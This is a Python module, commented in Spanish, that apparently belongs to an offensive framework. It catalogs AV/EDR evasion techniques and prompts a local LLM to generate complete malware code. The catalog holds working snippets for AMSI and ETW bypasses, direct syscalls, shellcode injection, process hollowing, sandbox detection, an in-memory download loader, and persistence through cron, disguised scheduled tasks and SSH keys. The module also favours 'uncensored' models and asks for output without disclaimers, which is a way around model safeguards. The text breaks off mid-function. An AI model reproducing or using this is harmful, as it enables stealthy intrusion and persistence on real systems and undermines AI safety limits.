"""
Skill: evasion_dev
Generador de código ofensivo con metodología completa de evasión AV/EDR.
Conoce y aplica técnicas reales: AMSI bypass, ETW patching, sleep obfuscation,
direct/indirect syscalls, process injection, sandbox evasion, persistencia,
obfuscación/encoders, loaders, shellcode. Genera el código con la técnica
solicitada usando el modelo Ollama más adecuado.

Contexto: framework de pentesting con autorización expresa. Laboratorio controlado.
"""
import os
import re
import json
import importlib.util
from pathlib import Path
from datetime import datetime

try:
    import requests as _req
except ImportError:
    _req = None

META = {
    "name": "evasion_dev",
    "category": "desarrollo",
    "description": (
        "Genera código de evasión AV/EDR con metodología real: AMSI bypass, ETW patch, "
        "sleep obfuscation, syscalls, process injection, sandbox evasion, persistencia, "
        "encoders/obfuscación, loaders en memoria. Elige técnica + payload → código listo."
    ),
    "args": ["technique", "payload", "language", "arch", "model", "output_dir"],
    "example": 'SKILL:evasion_dev technique=amsi_patch payload="shellcode.bin" language=csharp',
}

# ─────────────────────────────────────────────────────────────────────────────
# CATÁLOGO DE TÉCNICAS
# ─────────────────────────────────────────────────────────────────────────────

TECHNIQUES: dict = {

    # ── AMSI (Anti-Malware Scan Interface) ────────────────────────────────────
    "amsi_patch": {
        "name": "AMSI Bypass — Patch AmsiScanBuffer",
        "os": "windows",
        "category": "amsi",
        "langs": ["csharp", "powershell", "c"],
        "risk": "medium",
        "description": (
            "Parcheaa AmsiScanBuffer in-memory modificando sus primeros bytes para que "
            "retorne AMSI_RESULT_CLEAN (0x80070057 o `xor eax,eax; ret`). "
            "Funciona en PowerShell y .NET antes del scan."
        ),
        "code_context": (
            "Usa VirtualProtect para hacer la región de amsi.dll ejecutable/escribible, "
            "luego sobrescribe con `mov eax,0x80070057; ret` (x64) o `xor eax,eax; ret` (x86). "
            "Importa amsi.dll con LoadLibrary, obtén dirección con GetProcAddress."
        ),
        "references": ["CVE-2018-8489", "mattifestation AMSI bypass", "rastamouse patching"],
        "detections": ["userland hook removal by EDRs", "memory signature scan on amsi.dll"],
        "countermeasures": "Combinar con ETW bypass y obfuscación del patcher.",
    },
    "amsi_reflection": {
        "name": "AMSI Bypass — Reflection (PowerShell)",
        "os": "windows",
        "category": "amsi",
        "langs": ["powershell", "csharp"],
        "risk": "low",
        "description": (
            "Usa Reflection de .NET para acceder al campo privado `amsiContext` de la clase "
            "AmsiUtils y ponerlo a null, o parchear `amsiInitFailed` a True. "
            "Clásico pero detectado por muchos AVs modernos."
        ),
        "code_context": (
            "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')."
            "GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true). "
            "Alternativa: SetField amsiContext."
        ),
        "detections": ["string-based detection of AmsiUtils + amsiInitFailed"],
        "countermeasures": "Dividir strings, usar char arrays o concatenación dinámica.",
    },
    "amsi_hwbp": {
        "name": "AMSI Bypass — Hardware Breakpoint (HWBP)",
        "os": "windows",
        "category": "amsi",
        "langs": ["c", "csharp"],
        "risk": "low",
        "description": (
            "Instala un hardware breakpoint en AmsiScanBuffer usando el contexto del hilo "
            "(VEH/SEH handler). Al dispararse, modifica RCX/EAX para forzar CLEAN. "
            "No toca la memoria de amsi.dll → bypassea integridad de memoria."
        ),
        "code_context": (
            "SetThreadContext con DR0=AmsiScanBuffer, DR7=activado. "
            "VEH handler: on EXCEPTION_SINGLE_STEP → modifica context.Rcx (pBuffer=empty) "
            "y context.Rip para saltar instrucción. Limpia DR7 después."
        ),
        "references": ["CCob HWBP technique", "Crummie5"],
        "detections": ["behavioral: VEH registration + NtSetContextThread on amsi.dll region"],
    },

    # ── ETW (Event Tracing for Windows) ───────────────────────────────────────
    "etw_patch": {
        "name": "ETW Bypass — NtTraceEvent patch",
        "os": "windows",
        "category": "etw",
        "langs": ["c", "csharp", "powershell"],
        "risk": "medium",
        "description": (
            "Parchea NtTraceEvent en ntdll.dll con `xor eax,eax; ret` para que las "
            "llamadas ETW retornen inmediatamente sin generar eventos. "
            "Silencia logs de PowerShell ScriptBlock, .NET ETW providers, Sysmon eventos 6+."
        ),
        "code_context": (
            "GetModuleHandle('ntdll.dll') + GetProcAddress('EtwEventWrite'). "
            "VirtualProtect PAGE_EXECUTE_READWRITE. WriteProcessMemory: 0xC3 (ret). "
            "Alternativamente parchea EtwEventSend."
        ),
        "references": ["xpn ETW patch", "MDSec blog"],
        "detections": ["memory integrity check on ntdll", "kernel ETW provider (bypassed en userland)"],
    },
    "etw_provider": {
        "name": "ETW — Disable Specific Provider",
        "os": "windows",
        "category": "etw",
        "langs": ["c", "csharp"],
        "risk": "low",
        "description": (
            "Desactiva el provider ETW de PowerShell o .NET modificando el flag "
            "ETW_PROVIDER_ENABLED en la estructura interna del proveedor. "
            "Más quirúrgico que parchear NtTraceEvent."
        ),
        "code_context": (
            "Busca GUID del provider en el PEB → LdrpEventLog. "
            "Alterna el campo IsEnabled a 0. "
            "En PowerShell: acceso por reflection a PSEtwLogProvider."
        ),
    },

    # ── Sleep Obfuscation ─────────────────────────────────────────────────────
    "sleep_ekko": {
        "name": "Sleep Obfuscation — Ekko",
        "os": "windows",
        "category": "sleep_obfuscation",
        "langs": ["c", "cpp"],
        "risk": "low",
        "description": (
            "Durante el sleep, cifra el shellcode en memoria con RC4 usando una clave aleatoria, "
            "establece la memoria como NO_ACCESS para evitar scans en memoria. "
            "Usa CreateTimerQueueTimer + RtlCaptureContext para desencriptar justo antes de despertar."
        ),
        "code_context": (
            "Timer: SystemFunction032 (RC4) para cifrar beacon/shellcode en heap. "
            "VirtualProtect(PAGE_NOACCESS) antes del sleep. "
            "RtlCaptureContext + SetEvent para restaurar contexto original al despertar. "
            "Usa NtCreateTimer + NtSetTimer para evitar CreateTimerQueueTimer hook."
        ),
        "references": ["Crummie5 Ekko", "GitHub ekko"],
        "detections": ["NtCreateTimer stack trace analysis"],
    },
    "sleep_foliage": {
        "name": "Sleep Obfuscation — Foliage",
        "os": "windows",
        "category": "sleep_obfuscation",
        "langs": ["c", "cpp"],
        "risk": "low",
        "description": (
            "Usa ROP chains + NtContinue para cifrar/descifrar el beacon con AES-256 "
            "durante el sleep, cambia permissions a PAGE_NOACCESS. "
            "Manipula el stack de retorno para que parezca una llamada legítima."
        ),
        "code_context": (
            "Gadgets ROP en ntdll: SetEvent + NtContinue. "
            "AES-256-CBC cifra la imagen en memoria. Fake call stack spoofing. "
            "Restaura RSP + RBP originales al despertar."
        ),
        "references": ["optiv Foliage", "C5Spider"],
    },

    # ── Syscalls directos/indirectos ──────────────────────────────────────────
    "syscall_direct": {
        "name": "Direct Syscalls (Hell's Gate / SysWhispers2)",
        "os": "windows",
        "category": "syscalls",
        "langs": ["c", "cpp", "asm"],
        "risk": "low",
        "description": (
            "En lugar de llamar a las wrappers de ntdll (que los EDRs hookean), "
            "resuelve el SSN (System Service Number) en tiempo de ejecución y ejecuta "
            "la instrucción `syscall` directamente en ensamblador. Bypassea userland hooks."
        ),
        "code_context": (
            "Lee el SSN desde ntdll en disco (no en memoria que podría estar hookeada). "
            "Hell's Gate: escanea la tabla de syscalls en ntdll.dll mapeado. "
            "SysWhispers2: genera stubs en tiempo de compilación. "
            "Asm stub: mov r10,rcx; mov eax,SSN; syscall; ret."
        ),
        "references": ["SysWhispers2", "Hells-Gate jthuraisamy", "Freshycalls"],
        "detections": ["kernel-level Sysmon ID 6+", "SyscallMonitor", "HVCI"],
    },
    "syscall_indirect": {
        "name": "Indirect Syscalls (Halos Gate / Tartarus Gate)",
        "os": "windows",
        "category": "syscalls",
        "langs": ["c", "cpp"],
        "risk": "low",
        "description": (
            "Llama `syscall` desde dentro de ntdll.dll para que el call stack luzca legítimo. "
            "Resuelve la dirección del opcode `syscall` en ntdll (si el hook cubre la función, "
            "busca el vecino más cercano). Bypassea call stack analysis de EDRs."
        ),
        "code_context": (
            "Halos Gate: si la función está hookeada (primer byte != 4C 8B D1), "
            "escanea funciones vecinas ±1 para encontrar SSN. "
            "Tartarus Gate: detecta hooks por patrones de bytes específicos. "
            "Redirige el call a ntdll syscall stub + SSN parcheado."
        ),
        "references": ["Halos Gate", "Tartarus Gate", "PassTheHash TartarusGate"],
    },

    # ── Process Injection ─────────────────────────────────────────────────────
    "inject_classic": {
        "name": "Classic Shellcode Injection (VirtualAllocEx + WriteProcessMemory)",
        "os": "windows",
        "category": "injection",
        "langs": ["c", "csharp", "powershell"],
        "risk": "high",
        "description": (
            "Abre un proceso remoto, aloca memoria ejecutable, escribe shellcode y crea "
            "un hilo remoto. Detectado por casi todos los EDRs sin obfuscación adicional."
        ),
        "code_context": (
            "OpenProcess(PROCESS_ALL_ACCESS) + VirtualAllocEx(PAGE_EXECUTE_READWRITE) + "
            "WriteProcessMemory + CreateRemoteThread. "
            "Mejora: alloca RW primero, escribe, luego VirtualProtectEx(RX)."
        ),
        "detections": ["CreateRemoteThread hook", "memory scan RX region"],
        "countermeasures": "Combinar con syscalls directos y sleep obfuscation.",
    },
    "inject_apc": {
        "name": "APC Injection (Early Bird)",
        "os": "windows",
        "category": "injection",
        "langs": ["c", "cpp"],
        "risk": "medium",
        "description": (
            "Crea el proceso objetivo en estado SUSPENDED, inyecta shellcode via "
            "QueueUserAPC/NtQueueApcThread antes del punto de entrada. "
            "Early Bird: el shellcode corre antes de que el proceso termine de cargar, "
            "antes de que los hooks del EDR se instalen."
        ),
        "code_context": (
            "CreateProcess(CREATE_SUSPENDED) + VirtualAllocEx + WriteProcessMemory. "
            "NtQueueApcThread(hThread, shellcode_addr). ResumeThread(hThread). "
            "Early Bird corre el APC en el contexto de ntdll antes de los hooks del EDR."
        ),
        "references": ["CheckPoint Early Bird"],
    },
    "inject_hollow": {
        "name": "Process Hollowing",
        "os": "windows",
        "category": "injection",
        "langs": ["c", "cpp"],
        "risk": "medium",
        "description": (
            "Crea un proceso legítimo (svchost, notepad) en SUSPENDED, desasigna su imagen "
            "con NtUnmapViewOfSection, asigna y escribe la nueva PE en la misma dirección base, "
            "fija el punto de entrada en el PEB y resume la ejecución."
        ),
        "code_context": (
            "CreateProcess(CREATE_SUSPENDED) + NtUnmapViewOfSection(hProcess, ImageBase). "
            "VirtualAllocEx(target_base, IMAGE_SIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE). "
            "Escribe headers + secciones PE. Parchea PEB.ImageBaseAddress. "
            "SetThreadContext(Rcx=EntryPoint). ResumeThread."
        ),
        "detections": ["NtUnmapViewOfSection call trace", "Sysmon Event 25"],
    },
    "inject_dll": {
        "name": "Reflective DLL Injection",
        "os": "windows",
        "category": "injection",
        "langs": ["c", "cpp"],
        "risk": "medium",
        "description": (
            "Una DLL contiene su propio loader PE. Se inyecta el buffer de la DLL en el proceso "
            "remoto y se llama a la función ReflectiveDLLInjection, que resuelve imports, "
            "reloca, y ejecuta DllMain desde memoria sin tocar el disco."
        ),
        "code_context": (
            "ReflectiveLoader: encuentra su propia ImageBase (hash de GetProcAddress), "
            "parsea PE en memoria, copia secciones, aplica relocations, resuelve imports "
            "via hash de nombres de función (djb2). Exporta ReflectiveDLLInjection."
        ),
        "references": ["ReflectiveDLLInjection by stephenfewer"],
    },
    "inject_threadhijack": {
        "name": "Thread Hijacking",
        "os": "windows",
        "category": "injection",
        "langs": ["c", "cpp"],
        "risk": "medium",
        "description": (
            "Suspende un hilo existente en el proceso objetivo, escribe el shellcode, "
            "modifica RIP/EIP del contexto del hilo para apuntar al shellcode, y lo reanuda. "
            "No crea nuevos hilos, más sigiloso que CreateRemoteThread."
        ),
        "code_context": (
            "OpenThread(THREAD_ALL_ACCESS) + SuspendThread. "
            "GetThreadContext → modifica ctx.Rip = shellcode_addr. "
            "SetThreadContext + ResumeThread."
        ),
    },

    # ── Sandbox Evasion ───────────────────────────────────────────────────────
    "sandbox_checks": {
        "name": "Sandbox / VM Detection",
        "os": "windows|linux",
        "category": "sandbox",
        "langs": ["c", "csharp", "python", "powershell"],
        "risk": "low",
        "description": (
            "Detecta entornos de análisis (sandboxes, VMs, debuggers) y aborta o duerme "
            "hasta que se considere en un sistema real."
        ),
        "code_context": (
            "Técnicas Windows:\n"
            "- IsDebuggerPresent / CheckRemoteDebuggerPresent\n"
            "- NtQueryInformationProcess (ProcessDebugPort, ProcessDebugFlags)\n"
            "- RDTSC timing: loop de 1M iteraciones < 1M ciclos → VM\n"
            "- cpuid hypervisor bit (ECX bit 31)\n"
            "- GetTickCount antes/después de sleep(1000) — si delta < 900ms → sandboxed\n"
            "- GetUserName() in ['SANDBOX','VIRUS','MALWARE','test']\n"
            "- GetComputerName() == 'DESKTOP-' patrones genéricos\n"
            "- número de procesos < 50 → posible sandbox\n"
            "- cantidad de archivos recientes en %APPDATA% < 5\n"
            "- MAC address vendors: VMware 00:0C:29, VirtualBox 08:00:27\n"
            "- Número de CPUs < 2\n"
            "- RAM total < 4GB\n"
            "- Resolución de pantalla < 1024x768\n"
            "Técnicas Linux:\n"
            "- /proc/cpuinfo: hypervisor flag\n"
            "- /sys/class/dmi/id/product_name: VirtualBox|VMware|QEMU\n"
            "- timing RDTSC\n"
            "- ptrace(PTRACE_TRACEME) → si retorna -1 → debuggeado\n"
        ),
    },
    "user_interaction": {
        "name": "User Interaction Check",
        "os": "windows",
        "category": "sandbox",
        "langs": ["c", "csharp", "powershell"],
        "risk": "low",
        "description": (
            "Espera interacción humana real antes de ejecutarse: movimiento de mouse, "
            "pulsaciones de tecla, click, tiempo activo > N minutos."
        ),
        "code_context": (
            "GetCursorPos() en loop, comparar posición; si cambia → usuario real. "
            "GetLastInputInfo() → si idleTime > umbral → no sandbox. "
            "SystemParametersInfo(SPI_GETSCREENSAVERRUNNING) → si activo → sandbox. "
            "Esperar N segundos (>60s) para superar timeouts de sandbox básicos."
        ),
    },

    # ── Obfuscación / Encoders ────────────────────────────────────────────────
    "obf_xor": {
        "name": "XOR Encoder / Encryptor",
        "os": "all",
        "category": "obfuscation",
        "langs": ["c", "python", "csharp", "powershell", "go"],
        "risk": "low",
        "description": (
            "Codifica shellcode/payload con XOR (clave fija o rolling). "
            "El stub decodifica in-situ antes de ejecutar. "
            "Evita firmas estáticas de AV básicos. Complementar con otras técnicas."
        ),
        "code_context": (
            "Clave de 4-32 bytes aleatoria. XOR byte a byte (rolling: key[i % key_len]). "
            "Guardar clave + blob cifrado. Stub: decode → VirtualProtect(RX) → ejecutar. "
            "Mejora: XOR + rotación de bits (ROL/ROR por clave secundaria)."
        ),
    },
    "obf_aes": {
        "name": "AES-256 Shellcode Encryptor",
        "os": "all",
        "category": "obfuscation",
        "langs": ["c", "csharp", "python", "go"],
        "risk": "low",
        "description": (
            "Cifra el shellcode con AES-256-CBC o AES-256-CTR. "
            "El loader descifra en memoria usando Windows CNG (BCryptDecrypt) o mbedTLS. "
            "La clave puede venir de la red, del entorno, o embebida ofuscada."
        ),
        "code_context": (
            "BCryptOpenAlgorithmProvider(BCRYPT_AES_ALGORITHM). "
            "BCryptSetProperty(BCRYPT_CHAINING_MODE, BCRYPT_CHAIN_MODE_CBC). "
            "BCryptGenerateSymmetricKey + BCryptDecrypt. "
            "IV aleatorio embebido antes del ciphertext. "
            "Alternativa Python: from Crypto.Cipher import AES."
        ),
    },
    "obf_string": {
        "name": "String Obfuscation (compiletime + runtime)",
        "os": "all",
        "category": "obfuscation",
        "langs": ["c", "cpp", "csharp"],
        "risk": "low",
        "description": (
            "Ofusca strings literales (rutas, funciones API, URLs) en tiempo de compilación "
            "usando macros XOR o templates C++17. Evita firmas basadas en strings."
        ),
        "code_context": (
            "C++ constexpr XOR: template <size_t N, uint8_t K> struct ObfStr { ... }. "
            "Macro OBFSTR('A','m','s','i','S','c','a','n') → deobfusca en runtime. "
            "C#: usa arrays char[] y construye el string carácter a carácter. "
            "PowerShell: concatenación o chars como int arrays."
        ),
    },
    "obf_pe": {
        "name": "PE Packer / Protector",
        "os": "windows",
        "category": "obfuscation",
        "langs": ["c", "cpp"],
        "risk": "medium",
        "description": (
            "Empaqueta el PE completo: cifra secciones, stub externo las descifra y carga "
            "la imagen en memoria sin tocar el disco. "
            "Técnica usada por UPX, Themida, y packers custom."
        ),
        "code_context": (
            "Stub: LoadLibrary(kernel32) + GetProcAddress manual (hash API). "
            "Descifra PE cifrado embebido (AES/XOR). "
            "Alinea secciones en memoria. Aplica relocations. "
            "Resuelve IAT. Llama OEP. "
            "Técnica avanzada: mapear en una DLL legítima (DLL hollowing)."
        ),
    },

    # ── Loaders / Execution ───────────────────────────────────────────────────
    "loader_shellcode": {
        "name": "In-Memory Shellcode Loader",
        "os": "windows",
        "category": "loader",
        "langs": ["c", "csharp", "go", "rust"],
        "risk": "medium",
        "description": (
            "Loader limpio que descarga o lee shellcode, lo descifra, lo aloca en memoria "
            "RW luego cambia a RX, y lo ejecuta via callbacks (EnumSystemLocales, "
            "CreateThreadpoolWait, etc.) para evitar CreateThread detectable."
        ),
        "code_context": (
            "Técnicas de ejecución sin CreateThread:\n"
            "- EnumSystemLocales((LOCALE_ENUMPROC)shellcode, 0)\n"
            "- CreateThreadpoolWait + SetThreadpoolWait\n"
            "- RtlCreateUserThread (undoc, llama en ntdll)\n"
            "- NtCreateThreadEx directamente\n"
            "- Fiber: ConvertThreadToFiber + CreateFiber(SwitchToFiber)\n"
            "- PoolParty: pool de hilos del proceso víctima\n"
            "Alloca siempre RW, escribe, VirtualProtect RX, ejecuta."
        ),
    },
    "loader_dotnet": {
        "name": ".NET Assembly In-Memory Loader",
        "os": "windows",
        "category": "loader",
        "langs": ["csharp", "powershell"],
        "risk": "medium",
        "description": (
            "Carga un .NET assembly cifrado desde memoria sin escribirlo a disco, "
            "resolviendo el tipo y método de punto de entrada mediante reflection. "
            "Útil para Cobalt Strike BOFs, SharpSploit, Seatbelt, etc."
        ),
        "code_context": (
            "byte[] assemblyBytes = DecryptAES(embeddedResource); "
            "Assembly asm = Assembly.Load(assemblyBytes); "
            "Type t = asm.GetType('Namespace.ClassName'); "
            "MethodInfo m = t.GetMethod('Main', BindingFlags.Static|BindingFlags.Public); "
            "m.Invoke(null, new object[]{ args }); "
            "Combinado con AMSI + ETW bypass antes del Load."
        ),
    },
    "loader_powershell": {
        "name": "PowerShell Encrypted Loader + AMSI/ETW Bypass",
        "os": "windows",
        "category": "loader",
        "langs": ["powershell"],
        "risk": "medium",
        "description": (
            "Script PowerShell completo: bypassea AMSI y ETW, descarga/descifra el payload "
            "(AES o XOR desde URL o embebido), lo carga en memoria. "
            "Evita Set-ExecutionPolicy con IEX."
        ),
        "code_context": (
            "1. AMSI bypass (reflection o patch).\n"
            "2. ETW bypass (NtTraceEvent patch).\n"
            "3. Descarga: (New-Object Net.WebClient).DownloadData('URL').\n"
            "4. Descifra: [System.Security.Cryptography.Aes] o XOR manual.\n"
            "5. Carga: [System.Reflection.Assembly]::Load($bytes).\n"
            "6. Invoca método con reflection.\n"
            "Ofuscar strings con char arrays para AMSI."
        ),
    },

    # ── Persistencia ──────────────────────────────────────────────────────────
    "persist_registry": {
        "name": "Windows Persistence — Registry Run Keys",
        "os": "windows",
        "category": "persistence",
        "langs": ["c", "csharp", "powershell"],
        "risk": "medium",
        "description": (
            "Agrega una entrada en HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run "
            "o HKLM (requiere admin). Se ejecuta en cada login del usuario. "
            "Técnica conocida pero efectiva sin detección avanzada."
        ),
        "code_context": (
            "RegOpenKeyEx(HKEY_CURRENT_USER, Run key) + RegSetValueEx. "
            "PowerShell: Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' "
            "Alternativas: RunOnce, RunServices, Winlogon Userinit, Shell."
        ),
        "detections": ["Sysmon Event 13 (Registry modification)"],
        "countermeasures": "Usar registro menos conocido: HKCU\\Environment o COM hijack.",
    },
    "persist_scheduled": {
        "name": "Windows Persistence — Scheduled Task",
        "os": "windows",
        "category": "persistence",
        "langs": ["c", "csharp", "powershell"],
        "risk": "medium",
        "description": (
            "Crea una tarea programada que se ejecuta en login, al inicio, o cada X minutos. "
            "Puede hacerse con COM (ITaskService) o schtasks.exe. "
            "Técnica de bajo perfil si el nombre de la tarea parece legítimo."
        ),
        "code_context": (
            "schtasks /create /tn 'WindowsDefenderUpdate' /tr 'C:\\payload.exe' "
            "/sc onlogon /ru SYSTEM (admin). "
            "COM: CoCreateInstance(CLSID_TaskScheduler) → ITaskDefinition → IActionCollection. "
            "PowerShell: New-ScheduledTask + Register-ScheduledTask."
        ),
        "detections": ["Sysmon Event 1 (schtasks)", "Windows Security 4698"],
    },
    "persist_service": {
        "name": "Windows Persistence — Service",
        "os": "windows",
        "category": "persistence",
        "langs": ["c", "csharp"],
        "risk": "high",
        "description": (
            "Registra el payload como servicio de Windows (requiere admin/SYSTEM). "
            "Se inicia automáticamente con el sistema. "
            "Puede enmascararse como servicio legítimo (mismo nombre de DLL del sistema)."
        ),
        "code_context": (
            "CreateService(hSCManager, 'ServiceName', ..., SERVICE_AUTO_START, ...). "
            "Implementa ServiceMain + Handler. StartService. "
            "Técnica avanzada: DLL hijacking de servicio existente (ej: wlansvc)."
        ),
    },
    "persist_com": {
        "name": "Windows Persistence — COM Hijacking",
        "os": "windows",
        "category": "persistence",
        "langs": ["c", "csharp", "powershell"],
        "risk": "low",
        "description": (
            "Registra una DLL maliciosa bajo HKCU\\Software\\Classes\\CLSID\\{GUID} "
            "para interceptar la carga de un COM object usado por el sistema. "
            "No requiere privilegios elevados. Se activa cuando Windows invoca el COM."
        ),
        "code_context": (
            "Usa ProcMon para encontrar CLSIDs buscados en HKCU (resultado 'NAME NOT FOUND'). "
            "Registrar DLL: HKCU\\Software\\Classes\\CLSID\\{GUID}\\InProcServer32 → DLL path. "
            "CLSIDs comunes: {B5F8350B-0548-48B1-A6EE-88BD00B4A5E7} (Explorer), "
            "{9BA05972-F6A8-11CF-A442-00A0C90A8F39} (IE), MsOffice CLSIDs."
        ),
        "references": ["enigma0x3 COM Hijacking"],
        "detections": ["Sysmon Event 13 (HKCU CLSID)"],
    },
    "persist_linux_cron": {
        "name": "Linux Persistence — Cron / Systemd / Bashrc",
        "os": "linux",
        "category": "persistence",
        "langs": ["bash", "python"],
        "risk": "medium",
        "description": "Múltiples métodos de persistencia en Linux.",
        "code_context": (
            "Métodos:\n"
            "1. Cron: (crontab -l 2>/dev/null; echo '* * * * * /tmp/.x') | crontab -\n"
            "2. ~/.bashrc / ~/.profile: append 'nohup /tmp/.x &>/dev/null &'\n"
            "3. Systemd user service: ~/.config/systemd/user/backdoor.service\n"
            "   [Service] ExecStart=/tmp/.x; [Install] WantedBy=default.target\n"
            "4. /etc/rc.local (si existe)\n"
            "5. PAM module (avanzado, requiere root)\n"
            "6. LD_PRELOAD en /etc/ld.so.preload (root)\n"
            "7. Git hooks en repos existentes\n"
            "8. ~/.ssh/authorized_keys: añadir clave pública propia"
        ),
    },

    # ── Evasión de EDR ────────────────────────────────────────────────────────
    "edr_unhook": {
        "name": "EDR Unhooking (Fresh NTDLL)",
        "os": "windows",
        "category": "edr_evasion",
        "langs": ["c", "cpp"],
        "risk": "low",
        "description": (
            "Los EDRs hookean ntdll.dll en memoria para interceptar syscalls. "
            "Carga una copia limpia de ntdll.dll desde disco o desde KnownDlls "
            "y reemplaza las páginas hookeadas en el proceso actual."
        ),
        "code_context": (
            "Opción 1: Leer ntdll.dll desde disco → comparar .text section → copiar bytes originales.\n"
            "Opción 2: MapViewOfFile(ntdll from disk) → copiar .text al mapping en memoria del proceso.\n"
            "Opción 3: NtOpenSection(\\KnownDlls\\ntdll.dll) → NtMapViewOfSection.\n"
            "Opción 4: Perun's Fart — suspende el proceso, lee ntdll sin hooks via Nt calls propios."
        ),
        "references": ["MDSec unhooking", "Sektor7 EDR bypass"],
    },
    "edr_callstack": {
        "name": "Call Stack Spoofing",
        "os": "windows",
        "category": "edr_evasion",
        "langs": ["c", "cpp", "asm"],
        "risk": "low",
        "description": (
            "Los EDRs analizan el call stack para detectar llamadas sospechosas. "
            "Falsifica el call stack insertando gadgets/frames de módulos legítimos (ntdll, kernel32) "
            "usando técnicas de ROP/fibras."
        ),
        "code_context": (
            "Técnicas:\n"
            "- Synthetic frames: construye CONTEXT.Rsp apuntando a gadgets en ntdll.\n"
            "- Fiber spoofing: ConvertThreadToFiber, switchcontext.\n"
            "- Desync con SleepEx(INFINITE) + SetTimer para que el stack luzca en SleepEx.\n"
            "- El gadget más usado: `ret` en ntdll (un byte 0xC3)."
        ),
        "references": ["VulnDevComp call stack spoofing", "klezVirus"],
    },
}

# ─────────────────────────────────────────────────────────────────────────────
# HELPERS
# ─────────────────────────────────────────────────────────────────────────────

def _ollama_url() -> str:
    url = os.environ.get("OLLAMA_URL", "").strip()
    if url:
        return url
    env_path = Path(__file__).resolve().parent.parent.parent / ".env"
    if env_path.exists():
        for line in env_path.read_text(encoding="utf-8", errors="ignore").splitlines():
            if line.strip().startswith("OLLAMA_URL"):
                return line.partition("=")[2].strip().strip('"').strip("'")
    return "http://localhost:11434/api/chat"


def _ollama_chat(model: str, messages: list, timeout: int = 600) -> tuple:
    if _req is None:
        return "", "módulo 'requests' no disponible"
    payload = {"model": model, "messages": messages, "stream": False,
               "options": {"temperature": 0.15, "num_ctx": 16384}}
    try:
        r = _req.post(_ollama_url(), json=payload, timeout=timeout)
        r.raise_for_status()
        return r.json().get("message", {}).get("content", ""), ""
    except Exception as e:
        return "", str(e)


def _best_model() -> str:
    if _req is None:
        return ""
    base = os.environ.get("OLLAMA_URL", "http://localhost:11434/api/chat")
    tags_url = base.split("/api/")[0] + "/api/tags"
    try:
        r = _req.get(tags_url, timeout=6)
        models = [m["name"] for m in r.json().get("models", [])]
    except Exception:
        return ""
    pref = ["dolphin", "uncensored", "abliter", "hermes", "nous",
            "wizard", "deepseek-r1", "coder", "qwen", "llama"]
    for pref_kw in pref:
        for m in models:
            if pref_kw in m.lower():
                return m
    return models[0] if models else ""


def _extract_code(text: str) -> str:
    blocks = re.findall(r"```[a-zA-Z0-9+#]*\n(.*?)```", text, re.S)
    if blocks:
        return max(blocks, key=len).strip()
    return text.strip()


def _slug(s: str, n: int = 30) -> str:
    return (re.sub(r"[^\w]+", "_", s.lower()).strip("_")[:n] or "evasion").rstrip("_")


def _list_techniques(category_filter: str = "") -> str:
    cats: dict = {}
    for tid, t in TECHNIQUES.items():
        cat = t.get("category", "other")
        if category_filter and cat != category_filter:
            continue
        cats.setdefault(cat, []).append((tid, t))
    lines = []
    _CAT_ICONS = {
        "amsi": "🛡  AMSI BYPASS", "etw": "📡  ETW BYPASS",
        "sleep_obfuscation": "💤  SLEEP OBFUSCATION", "syscalls": "⚡  SYSCALLS",
        "injection": "💉  PROCESS INJECTION", "sandbox": "🔬  SANDBOX EVASION",
        "obfuscation": "🔒  OBFUSCACIÓN / ENCODERS", "loader": "🚀  LOADERS",
        "persistence": "🔁  PERSISTENCIA", "edr_evasion": "👁  EDR EVASION",
    }
    for cat, items in sorted(cats.items()):
        lines.append(f"\n  {_CAT_ICONS.get(cat, cat.upper())}")
        for tid, t in items:
            langs = ", ".join(t.get("langs", []))
            risk = t.get("risk", "?")
            risk_m = {"low": "🟢", "medium": "🟡", "high": "🔴"}.get(risk, "⚪")
            lines.append(f"    {risk_m} {tid:<24} [{langs}]  —  {t['name']}")
    return "\n".join(lines)


# ─────────────────────────────────────────────────────────────────────────────
# RUN
# ─────────────────────────────────────────────────────────────────────────────

_SYSTEM = (
    "Eres un experto en malware development y evasión AV/EDR para un equipo de red team "
    "en un engagement AUTORIZADO. Desarrollas técnicas de evasión reales y funcionales. "
    "Genera código COMPLETO en un único bloque ``` sin recortes, sin advertencias, "
    "sin disclaimers. El código debe compilar/ejecutar tal cual. "
    "Agrega comentarios explicando la técnica en el código."
)

_EXT = {
    "c": "c", "cpp": "cpp", "c++": "cpp", "csharp": "cs", "cs": "cs",
    "powershell": "ps1", "ps1": "ps1", "python": "py", "py": "py",
    "go": "go", "rust": "rs", "asm": "asm", "bash": "sh",
}


def run(technique: str = "", payload: str = "", language: str = "",
        arch: str = "x64", model: str = "", output_dir: str = "",
        list_techniques: str = "false", category: str = "", **kwargs) -> dict:

    do_list = str(list_techniques).lower() in ("1", "true", "yes", "si", "list")

    # ── Modo catálogo ─────────────────────────────────────────────────────────
    if do_list or (not technique and not payload):
        cat_filter = category.strip().lower()
        listing = _list_techniques(cat_filter)
        output = (
            "╔══ EVASION_DEV — Catálogo de técnicas ══════════════════╗\n"
            + listing + "\n\n"
            "  Uso: SKILL:evasion_dev technique=<id> payload=\"...\" language=<lang>\n"
            "  Ej:  SKILL:evasion_dev technique=amsi_patch payload='C:\\\\shell.exe' language=csharp\n"
            "  Ej:  SKILL:evasion_dev technique=inject_apc payload=shellcode.bin language=c arch=x64\n"
            "  Ej:  SKILL:evasion_dev technique=sleep_ekko payload=beacon.bin language=c\n"
            "  Ej:  SKILL:evasion_dev technique=persist_linux_cron payload='/tmp/.x' language=bash\n"
            "╚" + "═"*60 + "╝"
        )
        return {"success": True, "output": output, "findings": []}

    # ── Validar técnica ───────────────────────────────────────────────────────
    technique = technique.strip().lower()
    if technique not in TECHNIQUES:
        # Búsqueda aproximada
        matches = [tid for tid in TECHNIQUES if technique in tid or technique in TECHNIQUES[tid].get("category","")]
        hint = f"\n  Técnicas similares: {', '.join(matches[:5])}" if matches else ""
        return {
            "success": False, "findings": [],
            "output": (
                f"  ✗ Técnica '{technique}' no encontrada.{hint}\n"
                "  Usa SKILL:evasion_dev list_techniques=true para ver el catálogo completo."
            ),
        }

    tech = TECHNIQUES[technique]
    lang = (language or tech.get("langs", ["c"])[0]).strip().lower()
    arch = (arch or "x64").strip()

    lines = [
        f"╔══ EVASION_DEV — {tech['name']} {'═'*max(0,48-len(tech['name']))}╗",
        f"  Técnica  : {technique}",
